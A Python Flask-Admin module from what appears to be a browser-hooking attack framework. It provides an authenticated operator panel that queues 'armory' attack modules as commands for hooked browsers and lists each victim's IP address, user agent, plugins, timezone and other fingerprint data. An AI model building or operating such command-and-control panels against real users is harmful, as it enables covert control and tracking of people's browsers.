from flask import abort
from flask import request, redirect
from flask_admin import AdminIndexView, BaseView, expose
from ..armory.parsers import Module
from ..command.models import Command
from ..hook.models import Hook
from ..helper.responses import OK_RESPONSE
from ..extensions import auth
from ..auth import AuthException, AuthModelView

class FishermanIndexView(AdminIndexView):
    def is_accessible(self):
        if not auth.authenticate():
            raise AuthException('Not authenticated.')
        else:
            return True
    
    def inaccessible_callback(self, name, **kwargs):
        return redirect(auth.challenge())
    
    @expose('/')
    def index(self):
        return super(FishermanIndexView, self).index()
    
    
class AttacksView(BaseView):
    def is_accessible(self):
        if not auth.authenticate():
            raise AuthException('Not authenticated.')
        else:
            return True
    
    def inaccessible_callback(self, name, **kwargs):
        return redirect(auth.challenge())
    
    @expose('/')
    def index(self):
        # /api/templates/admin/attacks_index.html (base admin folder)
        return self.render('admin/attacks_index.html', modules=Module.module_name_to_display_name) 

    @expose('/command', methods=['POST'])
    def command_update(self):
        id = request.form.get('id')
        module = request.form.get('module')

        if not id or not module:
            return abort(400)

        if not Module.has_value(module) or id not in [str(id_[0]) for id_ in Hook.query.with_entities(Hook.id).all()]:
            return abort(400)
        
        new_command = Command(
            hook_id=id,
            command=module
        )

        from ..extensions import db
        db.session.add(new_command)
        db.session.commit()
        return OK_RESPONSE
        
class CommandAdminView(AuthModelView):
    column_list = ('hook_id', 'command')
    form_columns = ('hook_id', 'command')
    column_labels = {'hook_id': 'Hook ID'}

class HookAdminView(AuthModelView):
    column_list = ('id', 'ip_address', 'user_agent', 'screen_resolution', 'browser_plugins', 'language', 'timezone', 'last_update')
    column_labels = {
        'id': 'Hook ID',
        'ip_address' : 'IP Address',
        'user_agent' : 'User Agent',
        'screen_resolution' : 'Screen Resolution',
        'browser_plugins' : 'Browser Plugins',
        'language' : 'Language',
        'timezone' : 'Timezone',
        'last_update' : 'Last Update'
    }
    